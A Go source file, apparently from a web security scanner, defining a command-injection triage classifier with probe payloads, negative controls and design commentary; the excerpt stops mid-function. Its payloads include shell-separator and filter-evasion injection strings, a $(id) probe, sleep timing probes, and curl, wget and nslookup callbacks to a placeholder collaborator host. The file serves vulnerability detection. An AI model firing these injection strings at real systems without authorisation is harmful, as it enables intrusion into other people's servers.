package triageclasses

import (
	"bytes"
	"fmt"
	"sort"
	"strings"

	"ars0n-framework-v2-server/utils/triage"
)

// OS COMMAND INJECTION, triage.ClassCMDI, CATALOGUE 1.3 and ladder 2.1.
//
// WHAT THIS CLASS ANSWERS. "Point commix at this slot", and nothing more. It does not confirm
// exploitability, it does not enumerate the filesystem and it does not try to get a shell. It
// spends a few purpose-built requests deciding whether a slot's bytes reach an argv array or a
// shell command line, and it labels the slot so the operator can run the expensive confirmer
// where it will pay.
//
// THE ORACLE, AND WHY IT IS TWO MECHANISMS IN ONE STRING. The primary rule is C-D1, computation.
// The POSIX body is
//
//	echo <M>a$((48271+91733))$(echo <M>s)
//
// which is ONE shell word: no space separates the three pieces, so the shell concatenates
// arithmetic expansion and command substitution into a single argument and echo writes the
// contiguous bytes
//
//	<M>a140004<M>s
//
// Both halves are SHELL BUILTINS. $(( )) is arithmetic expansion, echo is a builtin in every
// POSIX shell and an internal command in cmd.exe, so a hit proves a shell parsed the input
// WITHOUT executing one external binary. Nothing is read, nothing is written, nothing is killed
// and nothing is fetched from a third party. That is the whole reason the payload computes a
// number instead of running id or curl: the cheapest deterministic proof that costs the target
// nothing is the one that is safe to ship to every user.
//
// 48271 and 91733 sum to 140004, and those constants belong to THIS class alone (CATALOGUE 1.3).
// They are not SSTI's 1571273, not CSTI's 49660049, not NOSQL's 56861, not XPATH's 22547, not
// SQL's 28651, not ELI's -494967296 and not CSVI's 19263, so an answer in a body attributes to
// one class by arithmetic rather than by whoever looked first.
//
// WHY ONE ANSWER STRING AND NOT THREE MARKERS. CATALOGUE 1.3 writes the body with M1, M2 and M3,
// three consecutive ordinals from this class's stripe. A ProbeRequest carries exactly ONE marker
// and a classifier may not mint (utils/triage/marker.go: MintMarkerAt takes a capability this
// package cannot spell), so three markers per payload is not expressible today. The single-marker
// form loses nothing that matters: the two tag bytes 'a' and 's' sit at the arithmetic site and
// the substitution site, so
//
//	<M>a140004      proves arithmetic expansion ran
//	<M>a<M>s        proves command substitution ran
//	<M>a140004<M>s  proves both, in one contiguous run of bytes
//
// and all three are strings the request itself never contained, which is the property M1/M2/M3
// were buying. The divergence is recorded here and in the report so nobody re-derives it.
//
// THE ISOLATION LAW. Every payload below is this class's own. Nothing here is shared with SSTI,
// which also evaluates arithmetic, or with ELI, which also wraps integers, and no probe is
// skipped on the grounds that another class "already covers" a separator. A payload that two
// classes send cannot be attributed when a WAF blocks it or a validator rejects it, and an
// unattributable block becomes a clean for a class that was never tested. CheckPayloadIsolation
// fails the build on byte-equal payloads across classes, and the census probe below is
// deliberately NOT a bare marker for exactly that reason: SSTI-S0 and ELI-E0 are bare markers
// too, and all three would normalise to the same bytes.
//
// THE BLIND CASE, WHICH IS THE HONEST PART. When the slot does not echo anything and no
// collaborator is configured, this class has NO non-timing oracle at all. Not a weak one: none.
// A command ran, produced output nobody can see, and the response is byte-identical to the
// baseline. The verdict there is cannot_determine (no_oob_endpoint), it is named
// cmdiBlindNoOracle in the code, and it means "needs commix". It is never clean. Recording clean
// there is the exact bug this layer exists to stop, and it is the bug this codebase has shipped
// repeatedly: a check that could not run, written down as a check that passed.
//
// TIMING IS DECLARED AND DELIBERATELY NOT PLANNED. CATALOGUE 2.3 and 7.4 nominate timing as this
// class's secondary oracle, under seven preconditions, one of which is "one slot under timing
// measurement at a time across the whole run". PlanCtx exposes no field that says whether this
// slot holds that run-wide token, and N concurrent five-second sleeps against a pool of N workers
// is a denial of service the operator did not ask for. So CMDI-T0, CMDI-T2 and CMDI-T5 are
// DECLARED, so the gap is visible in the cost model and in every Untested list, and Plan never
// returns them. Timing is nominated here only, it would be SECONDARY only, and it is capped at
// suspicious if it is ever wired up.
type cmdiClassifier struct{}

func init() { triage.RegisterClassifier(cmdiClassifier{}) }

func (cmdiClassifier) ID() triage.ClassID { return triage.ClassCMDI }

// ---------------------------------------------------------------------------------------------
// PAYLOAD CONSTRUCTION
// ---------------------------------------------------------------------------------------------

const (
	// cmdiMark is the runner's marker placeholder. A classifier never mints a marker, so a
	// payload that needs the marker INSIDE it (rather than glued to one end by MarkerPos) spells
	// the placeholder and the runner substitutes the minted value. NormaliseMarkers maps a real
	// marker to this same token, so a payload written this way and a payload written with a
	// literal marker are the same bytes to the isolation check, which is what keeps the check
	// meaningful either way.
	//
	// IF THE RUNNER DOES NOT SUBSTITUTE, THIS CLASS SAYS SO OUT LOUD. cmdiFidelity below refuses
	// to let any verdict reach clean when the minted marker is missing from the wire form of a
	// probe that spells the placeholder. An unsubstituted placeholder would otherwise send bytes
	// whose answer string can never appear, and every slot in the corpus would read clean.
	cmdiMark = triage.MarkerPlaceholder

	// cmdiObservedValue is CATALOGUE notation <V>: the slot's observed value, substituted by the
	// runner. The argument-injection family and the bare-separator control need the real value,
	// because their whole point is to leave the application's own argument intact and add one
	// flag beside it. Same fidelity rule: an unexpanded <V> on the wire can never reach clean.
	cmdiObservedValue = "<V>"

	// cmdiOOBBase is CATALOGUE notation <oob>: the configured collaborator base, substituted by
	// the runner. The framework ships no default, so a class that spells this and is handed no
	// collaborator must not send the probe at all, and Plan does not.
	cmdiOOBBase = "<oob>"

	// The two tag bytes. They sit at the arithmetic site and the substitution site so one marker
	// distinguishes which mechanism fired. They are single bytes because a field that truncates
	// still leaves the marker plus one byte attributable.
	cmdiArithTag = "a"
	cmdiSubstTag = "s"

	// This class's own operands and their sum, CATALOGUE 1.3.
	cmdiOperandA = "48271"
	cmdiOperandB = "91733"
	cmdiSum      = "140004"

	// The confirmation operands, ladder 2.1: a hit is reproduced with a FRESH marker (every
	// ProbeRequest gets one) and FRESH operands, so a body that happens to contain 140004 for its
	// own reasons cannot confirm.
	cmdiConfirmA   = "39847"
	cmdiConfirmB   = "62159"
	cmdiConfirmSum = "102006"
)

// cmdiPOSIXBoth builds the two-mechanism POSIX body wrapped in one separator family.
//
// The body is built as one unbroken shell word on purpose. Insert a space anywhere inside it and
// echo receives three arguments, writes them space-separated, and the contiguous answer string
// the detector looks for never appears even on a target that is fully injectable.
func cmdiPOSIXBoth(open, close string) []byte {
	return []byte(open + "echo " + cmdiMark + cmdiArithTag +
		"$((" + cmdiOperandA + "+" + cmdiOperandB + "))$(echo " + cmdiMark + cmdiSubstTag + ")" + close)
}

// cmdiAnswerBoth is the contiguous byte run a live POSIX or PowerShell shell produces.
func cmdiAnswerBoth(m triage.Marker) []byte {
	return []byte(string(m) + cmdiArithTag + cmdiSum + string(m) + cmdiSubstTag)
}

// cmdiAnswerArith is the arithmetic half alone, for the families that carry no substitution
// (the header TAB form, brace expansion, and the whole cmd.exe battery).
func cmdiAnswerArith(m triage.Marker) []byte {
	return []byte(string(m) + cmdiArithTag + cmdiSum)
}

// cmdiAnswerSubst is the substitution half alone: the two tagged markers made adjacent by a
// command substitution that actually ran. CMDI-NC3 puts those same bytes in the REQUEST, which is
// what proves the detector is checking the wire and not just grepping the body.
func cmdiAnswerSubst(m triage.Marker) []byte {
	return []byte(string(m) + cmdiArithTag + string(m) + cmdiSubstTag)
}

// cmdiAnswerConfirm is the confirmation body's answer, with the fresh operands.
func cmdiAnswerConfirm(m triage.Marker) []byte {
	return []byte(string(m) + cmdiArithTag + cmdiConfirmSum + string(m) + cmdiSubstTag)
}

// cmdiTagPrefix is what the census probe proves reachable: the marker plus the arithmetic tag.
// If this never comes back, the slot does not echo, and the computation oracle was not quiet, it
// was structurally unavailable.
func cmdiTagPrefix(m triage.Marker) []byte { return []byte(string(m) + cmdiArithTag) }

// ---------------------------------------------------------------------------------------------
// PROBES
// ---------------------------------------------------------------------------------------------

// The probe ids, so Plan, Classify and the tests all name the same thing.
const (
	cmdiC0  triage.ProbeID = "CMDI-C0"
	cmdiDEC triage.ProbeID = "CMDI-DEC"

	cmdiB1  triage.ProbeID = "CMDI-B1"  // ;
	cmdiB2  triage.ProbeID = "CMDI-B2"  // &
	cmdiB3  triage.ProbeID = "CMDI-B3"  // |
	cmdiB4  triage.ProbeID = "CMDI-B4"  // &&
	cmdiB5  triage.ProbeID = "CMDI-B5"  // ||
	cmdiB6  triage.ProbeID = "CMDI-B6"  // raw LF
	cmdiB7  triage.ProbeID = "CMDI-B7"  // $( ), empty separator
	cmdiB8  triage.ProbeID = "CMDI-B8"  // backtick, empty separator
	cmdiB9  triage.ProbeID = "CMDI-B9"  // single-quote breakout
	cmdiB10 triage.ProbeID = "CMDI-B10" // double-quote breakout
	cmdiB11 triage.ProbeID = "CMDI-B11" // ${IFS}, whitespace-free
	cmdiB12 triage.ProbeID = "CMDI-B12" // $IFS$9, brace-free
	cmdiB13 triage.ProbeID = "CMDI-B13" // header only, TAB
	cmdiB14 triage.ProbeID = "CMDI-B14" // brace expansion
	cmdiB15 triage.ProbeID = "CMDI-B15" // external expr
	cmdiB16 triage.ProbeID = "CMDI-B16" // $(id), confirmation tier only
	cmdiB17 triage.ProbeID = "CMDI-B17" // $( ) with ${IFS}, whitespace-free, empty separator
	cmdiB18 triage.ProbeID = "CMDI-B18" // backtick with $IFS$9, whitespace-free and brace-free

	cmdiA1 triage.ProbeID = "CMDI-A1" // argument injection, --version
	cmdiA2 triage.ProbeID = "CMDI-A2" // -version
	cmdiA3 triage.ProbeID = "CMDI-A3" // -V
	cmdiA4 triage.ProbeID = "CMDI-A4" // --help
	cmdiA5 triage.ProbeID = "CMDI-A5" // the whole value replaced, leading-argument sink

	cmdiW1 triage.ProbeID = "CMDI-W1" // cmd.exe set /a
	cmdiW2 triage.ProbeID = "CMDI-W2" // cmd.exe for /f, both mechanisms
	cmdiW3 triage.ProbeID = "CMDI-W3" // cmd.exe %PATHEXT%, identification
	cmdiW4 triage.ProbeID = "CMDI-W4" // PowerShell
	cmdiW5 triage.ProbeID = "CMDI-W5" // cmd.exe %CD%, identification
	cmdiW6 triage.ProbeID = "CMDI-W6" // cmd.exe caret escape, filter evasion

	cmdiO1 triage.ProbeID = "CMDI-O1" // nslookup, DNS
	cmdiO2 triage.ProbeID = "CMDI-O2" // curl, HTTP
	cmdiO3 triage.ProbeID = "CMDI-O3" // wget, HTTP
	cmdiO4 triage.ProbeID = "CMDI-O4" // cmd.exe nslookup

	cmdiT0 triage.ProbeID = "CMDI-T0" // declared, never planned. See the header.
	cmdiT2 triage.ProbeID = "CMDI-T2"
	cmdiT5 triage.ProbeID = "CMDI-T5"

	cmdiS1 triage.ProbeID = "CMDI-S1" // $BASH_VERSION
	cmdiS2 triage.ProbeID = "CMDI-S2" // $0
	cmdiS3 triage.ProbeID = "CMDI-S3" // $OSTYPE

	cmdiCF1 triage.ProbeID = "CMDI-CF1" // confirmation, both mechanisms, fresh operands
	cmdiCF2 triage.ProbeID = "CMDI-CF2" // confirmation, arithmetic alone
	cmdiCF3 triage.ProbeID = "CMDI-CF3" // confirmation, substitution alone

	cmdiNC1 triage.ProbeID = "CMDI-NC1" // inert, same length band
	cmdiNC2 triage.ProbeID = "CMDI-NC2" // the answer, in the wire
	cmdiNC3 triage.ProbeID = "CMDI-NC3" // the substitution answer, in the wire
	cmdiNC4 triage.ProbeID = "CMDI-NC4" // a bare separator, no command
	cmdiNC5 triage.ProbeID = "CMDI-NC5" // a bare OOB label, no command
)

// cmdiEveryPoint is every insertion point this class reaches. KindBody covers the urlencoded
// field, the JSON string, the multipart part value and the multipart filename: the package's
// SlotKind is coarser than the CATALOGUE's point codes, and the finer distinction is carried by
// Slot.BodyMedia, which Plan reads.
var cmdiEveryPoint = []triage.SlotKind{
	triage.KindHeader, triage.KindCookie, triage.KindQuery, triage.KindBody, triage.KindPath,
}

// Probes is every payload this class will ever send, plus the three timing payloads it declares
// and never sends. CATALOGUE 1.3, with the four divergences recorded in the header and in
// class-cmdi.md.
func (cmdiClassifier) Probes() []triage.ProbeSpec {
	all := cmdiEveryPoint
	// The raw LF separator is deliverable only inside a multipart part body. A CR or LF in a
	// header value is rejected at send by net/http, loudly, and a cookie has no escape for it.
	body := []triage.SlotKind{triage.KindBody}
	header := []triage.SlotKind{triage.KindHeader}
	// The decode control perturbs the value with percent text, so it belongs on the points where
	// percent text is a question at all.
	decodable := []triage.SlotKind{triage.KindQuery, triage.KindBody, triage.KindPath, triage.KindCookie}

	enc := []triage.EncoderMode{
		triage.EncodeQuery, triage.EncodeForm, triage.EncodeJSONString,
		triage.EncodePathSegment, triage.EncodeHeaderValue, triage.EncodeCookie,
		triage.EncodeMultipartValue,
	}

	spec := func(id triage.ProbeID, logical []byte, pts []triage.SlotKind, tier triage.ProbeTier, note string) triage.ProbeSpec {
		p := triage.ProbeSpec{
			ID:        id,
			Class:     triage.ClassCMDI,
			Logical:   logical,
			Encoders:  enc,
			Points:    pts,
			MarkerPos: cmdiMarkerPos(logical),
			Tier:      tier,
			Risk:      triage.RiskR1,
			Notes:     note,
		}
		return p
	}
	ctl := func(id triage.ProbeID, logical []byte, pts []triage.SlotKind, note string) triage.ProbeSpec {
		p := spec(id, logical, pts, triage.TierFull, note)
		p.IsControl = true
		return p
	}

	out := []triage.ProbeSpec{
		// ---- census -------------------------------------------------------------------------
		spec(cmdiC0, []byte(cmdiMark+cmdiArithTag+"-cmdi-census"), all, triage.TierReduced,
			"the reflection census. It is NOT a bare marker, because SSTI-S0 and ELI-E0 are bare "+
				"markers and all three would normalise to the same bytes and fail the isolation law. "+
				"It carries the marker plus the arithmetic tag, which is exactly the prefix every real "+
				"payload's answer begins with, so a silent census means the computation oracle is "+
				"structurally unavailable rather than merely quiet."),

		// ---- this class's own decode control, ruling R6 ---------------------------------------
		spec(cmdiDEC, []byte(cmdiObservedValue+"%63%6d%64%69%2d%64%65%63%6f%64%65"), decodable, triage.TierFull,
			"this class's OWN decode control, never a shared gate (R6a). The percent text decodes to "+
				"the literal cmdi-decode. It carries no marker because a marker cannot be "+
				"percent-encoded through the placeholder mechanism, and a class-unique literal answers "+
				"the only question asked here: does this slot percent-decode. Planned only when "+
				"Slot.Constraints.DecodeDepth is unmeasured."),

		// ---- POSIX separator battery ----------------------------------------------------------
		spec(cmdiB1, cmdiPOSIXBoth(";", ";"), all, triage.TierReduced,
			"semicolon, the sh command separator. On a path segment it must travel as %3B or a "+
				"Servlet container reads it as a matrix parameter; on a cookie it is not cookie-octet at all."),
		spec(cmdiB2, cmdiPOSIXBoth("&", "&"), all, triage.TierFull,
			"ampersand, background-and-continue. Distinct from && and it is the one that survives "+
				"a filter written against the boolean operators only."),
		spec(cmdiB3, cmdiPOSIXBoth("|", ""), all, triage.TierFull,
			"pipe, and it needs no terminator: our own output is what the pipeline carries, so there "+
				"is nothing to suppress."),
		spec(cmdiB4, cmdiPOSIXBoth("&&", "&&:"), all, triage.TierReduced,
			"boolean and. The trailing colon is the POSIX no-op, so the original command's tail "+
				"parses without running anything of ours a second time."),
		spec(cmdiB5, cmdiPOSIXBoth("||", "||:"), all, triage.TierFull,
			"boolean or, which is the separator that fires when the original command FAILS, and a "+
				"payload-bearing argument very often makes it fail."),
		spec(cmdiB6, cmdiPOSIXBoth("\n", "\n"), body, triage.TierFull,
			"a RAW newline, which is a command separator in every shell and is invisible to a filter "+
				"written against ; & | only. Deliverable only inside a multipart part body: net/http "+
				"refuses CR and LF in a header value at send, loudly, and a cookie cannot carry one."),

		// ---- command substitution, the empty-separator family ---------------------------------
		spec(cmdiB7, []byte("$(echo "+cmdiMark+cmdiArithTag+"$(("+cmdiOperandA+"+"+cmdiOperandB+"))"+cmdiMark+cmdiSubstTag+")"),
			all, triage.TierReduced,
			"EMPTY separator. This is the only family that reaches a CORRECTLY double-quoted command, "+
				"where every separator byte is inert and $( ) still expands. A class that shipped "+
				"separators alone would record clean on every properly quoted shell call, which is the "+
				"most common way a real command injection is written."),
		spec(cmdiB8, []byte("`echo "+cmdiMark+cmdiArithTag+"$(("+cmdiOperandA+"+"+cmdiOperandB+"))"+cmdiMark+cmdiSubstTag+"`"),
			all, triage.TierFull,
			"the backtick form of the same mechanism. Shipped separately and not folded into B7 "+
				"because a great many filters block the two bytes $( and nothing else, and the "+
				"isolation law's reasoning applies inside a class too: if the two forms shared one "+
				"payload, a block could not be attributed to either."),

		spec(cmdiB17, []byte("$(echo${IFS}"+cmdiMark+cmdiArithTag+"$(("+cmdiOperandA+"+"+cmdiOperandB+"))"+cmdiMark+cmdiSubstTag+")"),
			all, triage.TierFull,
			"the substitution family with no whitespace anywhere. EVERY byte of it is cookie-octet, so "+
				"this is the only family that reaches a cookie the framework will not percent-decode, "+
				"and without it that whole surface would be decode_depth_0 with nothing sent. Found by "+
				"the decode-depth test: B7 and B8 both carry a space, which a cookie cannot."),
		spec(cmdiB18, []byte("`echo$IFS$9"+cmdiMark+cmdiArithTag+"$(("+cmdiOperandA+"+"+cmdiOperandB+"))"+cmdiMark+cmdiSubstTag+"`"),
			all, triage.TierFull,
			"the same reach with a backtick and no braces, for a filter that blocks ${ and for a "+
				"template layer that would eat the braces before the shell ever saw them."),

		// ---- quote breakout --------------------------------------------------------------------
		spec(cmdiB9, cmdiPOSIXBoth("';", ";'"), all, triage.TierFull,
			"single-quote breakout, for a sink that interpolates into '<V>'. Inside single quotes "+
				"every metacharacter is literal, so without this the entire single-quoted context "+
				"reads clean."),
		spec(cmdiB10, cmdiPOSIXBoth("\";", ";\""), all, triage.TierFull,
			"double-quote breakout, for a sink that interpolates into \"<V>\". A raw double quote "+
				"cannot be written into a JSON string slot as a literal quote, so Plan skips this one "+
				"on a JSON body and records it Untested (json_string) rather than sending something else."),

		// ---- whitespace-free ---------------------------------------------------------------------
		spec(cmdiB11, []byte(";echo${IFS}"+cmdiMark+cmdiArithTag+"$(("+cmdiOperandA+"+"+cmdiOperandB+"))$(echo${IFS}"+cmdiMark+cmdiSubstTag+");"),
			all, triage.TierFull,
			"${IFS} in place of every space. Every byte of it is cookie-octet, and a space is not, so "+
				"this is the family that reaches a cookie whose value the framework will not "+
				"percent-decode. It is also the standard answer to a filter that rejects whitespace."),
		spec(cmdiB12, []byte(";echo$IFS$9"+cmdiMark+cmdiArithTag+"$(("+cmdiOperandA+"+"+cmdiOperandB+"))$(echo$IFS$9"+cmdiMark+cmdiSubstTag+");"),
			all, triage.TierFull,
			"brace-free whitespace evasion. $IFS$9 expands to the field separator followed by the "+
				"empty ninth positional parameter, so it needs no { }, which matters against a filter "+
				"that blocks ${ and against a template layer that would eat the braces first."),

		// ---- points with their own shape -----------------------------------------------------
		spec(cmdiB13, []byte("echo\t"+cmdiMark+cmdiArithTag+"$(("+cmdiOperandA+"+"+cmdiOperandB+"))"), header, triage.TierFull,
			"header only. A TAB is field-content in RFC 9110 and travels raw in a header value, and "+
				"it is a CTL in a cookie. This family exists because log processors and geo-IP lookups "+
				"feed X-Forwarded-For and User-Agent straight into shell scripts."),
		spec(cmdiB14, []byte("{echo,"+cmdiMark+cmdiArithTag+"$(("+cmdiOperandA+"+"+cmdiOperandB+"))}"), all, triage.TierFull,
			"bash brace expansion, no space anywhere. UNVERIFIED on dash, which has no brace "+
				"expansion, so a silence here says nothing about a dash target and the verdict never "+
				"leans on it alone."),
		spec(cmdiB15, []byte(";echo "+cmdiMark+cmdiArithTag+"$(expr "+cmdiOperandA+" + "+cmdiOperandB+");"), all, triage.TierFull,
			"the external expr, which is commix's own --use-backticks shape. It is the one POSIX "+
				"probe that needs a binary on PATH, so it distinguishes a shell with a normal "+
				"environment from a stripped busybox that has builtins only."),
		spec(cmdiB16, []byte(";echo "+cmdiMark+cmdiArithTag+"$(id);"), all, triage.TierFull,
			"CONFIRMATION TIER ONLY, planned only after C-D1 has already fired. id is read-only and "+
				"writes nothing, and it is the cheapest proof that a real external command ran rather "+
				"than a builtin being emulated by a WAF's sandbox."),

		// ---- argument injection ------------------------------------------------------------------
		spec(cmdiA1, []byte(cmdiObservedValue+" --version"), all, triage.TierReduced,
			"ARGUMENT INJECTION. The value becomes a FLAG, not a command. This is the only family "+
				"that reaches execve with an argv array, where there is no shell, no separator has any "+
				"meaning, and every probe above is correctly silent. A class without it records clean "+
				"on every exec.Command(tool, userValue) in the world."),
		spec(cmdiA2, []byte(cmdiObservedValue+" -version"), all, triage.TierFull,
			"the single-dash long form, which is what the JVM tools, ffmpeg's older builds and a lot "+
				"of vendor binaries accept and --version does not reach."),
		spec(cmdiA3, []byte(cmdiObservedValue+" -V"), all, triage.TierFull,
			"the short form. Cheap, and it is the one that works on the BSD-style tools."),
		spec(cmdiA4, []byte(cmdiObservedValue+" --help"), all, triage.TierFull,
			"the usage block, graded no higher than medium: a usage block is a weaker signature than "+
				"a version banner because plenty of applications print their own."),
		spec(cmdiA5, []byte("--version"), all, triage.TierFull,
			"the whole value replaced, for a LEADING-argument sink where the application appends its "+
				"own arguments after ours. Distinct bytes from A1 on purpose: if the two shared a "+
				"payload, a rejection could not be attributed to either shape."),

		// ---- cmd.exe and PowerShell ----------------------------------------------------------
		spec(cmdiW1, []byte("&<nul set /p="+cmdiMark+cmdiArithTag+"&set /a "+cmdiOperandA+"+"+cmdiOperandB+"&rem "), all, triage.TierFull,
			"cmd.exe. <nul set /p= writes the marker with no newline, set /a is the internal "+
				"arithmetic command, and rem swallows the tail. Both are INTERNAL commands, so nothing "+
				"is executed off disk. Note the encoder must send % as %25 and < as %3C on a query, "+
				"form or path slot."),
		spec(cmdiW2, []byte("&for /f \"tokens=* eol=\" %i in ('cmd /c \"set /a ("+cmdiOperandA+"+"+cmdiOperandB+")\"') do @<nul set /p="+cmdiMark+cmdiArithTag+"%i"+cmdiMark+cmdiSubstTag+"&rem "),
			all, triage.TierFull,
			"commix's own decision-payload shape for cmd.exe: a for /f capture is the Windows "+
				"analogue of command substitution, so this is the probe that proves BOTH mechanisms "+
				"on Windows the way B1 does on POSIX."),
		spec(cmdiW3, []byte("&echo "+cmdiMark+cmdiArithTag+"%PATHEXT%&rem "), all, triage.TierFull,
			"identification, and unambiguous: %PATHEXT% expands to .COM;.EXE;.BAT;.CMD on cmd.exe "+
				"and to nothing anywhere else. No arithmetic, so it fires on a Windows target whose "+
				"set /a was filtered."),
		spec(cmdiW4, []byte(";Write-Output \""+cmdiMark+cmdiArithTag+"$("+cmdiOperandA+"+"+cmdiOperandB+")"+cmdiMark+cmdiSubstTag+"\""), all, triage.TierFull,
			"PowerShell, where the subexpression operator $( ) does the arithmetic and the "+
				"semicolon is the statement separator. UNVERIFIED against a live PowerShell sink; a "+
				"silence here is not evidence about a PowerShell target."),
		spec(cmdiW5, []byte("&echo "+cmdiMark+cmdiArithTag+"%CD%&rem "), all, triage.TierFull,
			"identification: %CD% expands to a drive-lettered path, so the answer shape is the "+
				"marker followed by a letter, a colon and a backslash."),
		spec(cmdiW6, []byte("&<nul se^t /p="+cmdiMark+cmdiArithTag+"&se^t /a "+cmdiOperandA+"+"+cmdiOperandB+"&rem "), all, triage.TierFull,
			"THE CMD.EXE CARET. cmd strips ^ before it parses the command name, so se^t runs set "+
				"while a keyword filter matching the literal string set sees nothing. This family has "+
				"no POSIX analogue and no separator probe finds it, which is why it is shipped "+
				"separately from W1 rather than treated as a variant of it."),

		// ---- out of band -----------------------------------------------------------------------
		spec(cmdiO1, []byte(";nslookup${IFS}"+cmdiMark+"."+cmdiOOBBase+";"), all, triage.TierFull,
			"the DNS callback, the only oracle this class has when the slot does not echo. "+
				"nslookup resolves a name and writes nothing anywhere. Planned only when a "+
				"collaborator is configured; absent one the verdict is cannot_determine, never clean."),
		spec(cmdiO2, []byte(";curl${IFS}-s${IFS}-o${IFS}/dev/null${IFS}http://"+cmdiMark+"."+cmdiOOBBase+"/;"), all, triage.TierFull,
			"the HTTP callback. Output is discarded to /dev/null rather than fetched into anything, "+
				"and curl.exe has shipped in Windows since 10 build 1803, so this one form covers both "+
				"operating systems. It reaches the case where DNS egress is blocked and HTTP is not."),
		spec(cmdiO3, []byte(";wget${IFS}-q${IFS}-O${IFS}/dev/null${IFS}http://"+cmdiMark+"."+cmdiOOBBase+"/;"), all, triage.TierFull,
			"the other HTTP client, because a stripped container often has one and not the other."),
		spec(cmdiO4, []byte("&nslookup "+cmdiMark+"."+cmdiOOBBase+"&rem "), all, triage.TierFull,
			"the cmd.exe DNS callback, which is the only oracle for a blind Windows target."),

		// ---- timing, declared and never planned ------------------------------------------------
		func() triage.ProbeSpec {
			p := spec(cmdiT0, []byte(";sleep${IFS}0;"+cmdiMark), all, triage.TierOptIn,
				"DECLARED AND NEVER PLANNED. The zero dose, which is the control that says an "+
					"elevated baseline is the separator's fault and not the sleep's. See the file "+
					"header: timing needs a run-wide serialisation token that PlanCtx does not expose.")
			p.Risk = triage.RiskR2
			return p
		}(),
		func() triage.ProbeSpec {
			p := spec(cmdiT2, []byte(";sleep${IFS}2;"+cmdiMark), all, triage.TierOptIn,
				"DECLARED AND NEVER PLANNED. The middle dose of the three-point dose response.")
			p.Risk = triage.RiskR2
			return p
		}(),
		func() triage.ProbeSpec {
			p := spec(cmdiT5, []byte(";sleep${IFS}5;"+cmdiMark), all, triage.TierOptIn,
				"DECLARED AND NEVER PLANNED. Five seconds is the ceiling; N of these at once against "+
					"a pool of N workers is a denial of service the operator did not ask for.")
			p.Risk = triage.RiskR2
			return p
		}(),

		// ---- identification, after a hit ---------------------------------------------------------
		spec(cmdiS1, []byte(";echo "+cmdiMark+cmdiArithTag+"$BASH_VERSION;"), all, triage.TierFull,
			"identification, planned only after a hit. Empty on dash and on sh, which is itself the answer."),
		spec(cmdiS2, []byte(";echo "+cmdiMark+cmdiArithTag+"$0;"), all, triage.TierFull,
			"identification, the cheapest single answer: sh, bash or dash in one token."),
		spec(cmdiS3, []byte(";echo "+cmdiMark+cmdiArithTag+"$OSTYPE;"), all, triage.TierFull,
			"identification: linux-gnu, darwin or freebsd, which is what commix wants to know before it starts."),

		// ---- confirmation, fresh operands ---------------------------------------------------------
		spec(cmdiCF1, []byte(";echo "+cmdiMark+cmdiArithTag+"$(("+cmdiConfirmA+"+"+cmdiConfirmB+"))$(echo "+cmdiMark+cmdiSubstTag+");"), all, triage.TierFull,
			"CONFIRMATION. Fresh marker, because every ProbeRequest gets one, and fresh operands "+
				"summing to 102006, so a body that carried 140004 for its own reasons cannot confirm. "+
				"Grade high requires this probe, not just the first hit."),
		spec(cmdiCF2, []byte(";echo "+cmdiMark+cmdiArithTag+"$(("+cmdiConfirmA+"+"+cmdiConfirmB+"));"), all, triage.TierFull,
			"CONFIRMATION, arithmetic ALONE, so the report can say which mechanism works rather than "+
				"that something worked. commix takes a different technique for each."),
		spec(cmdiCF3, []byte(";echo "+cmdiMark+cmdiArithTag+"$(echo "+cmdiMark+cmdiSubstTag+");"), all, triage.TierFull,
			"CONFIRMATION, substitution ALONE. Together with CF2 this separates a sink that expands "+
				"$(( )) from one that expands $( ), which are different filters and different techniques."),

		// ---- negative controls --------------------------------------------------------------------
		ctl(cmdiNC1, []byte(cmdiMark+cmdiArithTag+"SEMIechoSP"+cmdiMark+cmdiArithTag+
			"DOLLARLPARLPAR"+cmdiOperandA+"PLUS"+cmdiOperandB+"RPARRPARDOLLARLPARechoSP"+cmdiMark+cmdiSubstTag+"RPAR"), all,
			"INERT, in the same length band as B1, with every metacharacter spelled as a word. If "+
				"C-D1 fires on this the detector is matching something other than a shell, and every "+
				"verdict on this slot becomes cannot_determine (detector_unverified)."),
		ctl(cmdiNC2, []byte(cmdiMark+cmdiArithTag+cmdiSum+cmdiMark+cmdiSubstTag), all,
			"THE ANSWER, IN THE WIRE. A reflecting endpoint hands this straight back. The detector "+
				"must stay silent, because its rule is the answer in the RESPONSE and not in the "+
				"REQUEST. This is the control that separates command injection from an echo."),
		ctl(cmdiNC3, []byte(cmdiMark+cmdiArithTag+cmdiMark+cmdiSubstTag), all,
			"THE SUBSTITUTION ANSWER, IN THE WIRE: the two tagged markers already adjacent. The "+
				"substitution rule must stay silent on a reflection of it."),
		ctl(cmdiNC4, []byte(cmdiObservedValue+";"), all,
			"A BARE SEPARATOR AND NO COMMAND. It changes the response of anything that splits on "+
				"semicolons and it runs nothing at all, so no rule in this class may fire on it."),
		ctl(cmdiNC5, []byte(cmdiMark+cmdiArithTag+".cmdi."+cmdiOOBBase), all,
			"A BARE OOB LABEL: a hostname, no separator, no command. Its bytes carry this class's own "+
				"name so that a bare <marker>.<oob> label from SSRF or RFI can never be byte-equal to it. "+
				"If THIS resolves, the target's "+
				"egress resolves every hostname-shaped string it is handed, by a DLP scanner or a link "+
				"unfurler or a URL validator, and a DNS-only hit from O1 or O4 proves nothing. That "+
				"case is cannot_determine (egress_resolver) and it is the difference between a real "+
				"blind finding and a report the operator has to withdraw."),
	}
	return out
}

// cmdiMarkerPos says where the runner's minted marker belongs. Every payload here spells the
// placeholder itself, so the answer is prefix when the placeholder starts the payload and inline
// otherwise, and Plan carries the offset in Variant["marker_offset"].
func cmdiMarkerPos(logical []byte) triage.MarkerPos {
	i := bytes.Index(logical, []byte(cmdiMark))
	switch {
	case i == 0:
		return triage.MarkerPrefix
	case i < 0:
		// Only CMDI-DEC and CMDI-A1..A5 get here: they carry no marker at all. Prefix is the
		// harmless default and Classify never looks for a marker in their responses.
		return triage.MarkerPrefix
	default:
		return triage.MarkerInline
	}
}

// ---------------------------------------------------------------------------------------------
// REACHABILITY
// ---------------------------------------------------------------------------------------------

// Reaches. CATALOGUE 3.1 gives this class no eligibility gate: every non-credential,
// server-reachable slot is probed, and a value's SHAPE never suppresses a probe. A slot whose
// value looks like a UUID is still an argument to something.
func (cmdiClassifier) Reaches(k triage.SlotKind, mt triage.MediaType) triage.Reachability {
	switch k {
	case triage.KindHeader:
		return triage.Reachability{Reach: triage.ReachAlways}
	case triage.KindQuery:
		return triage.Reachability{Reach: triage.ReachAlways}
	case triage.KindPath:
		return triage.Reachability{
			Reach: triage.ReachConditional,
			Reason: "a path segment carries every payload, but the semicolon families must travel as %3B " +
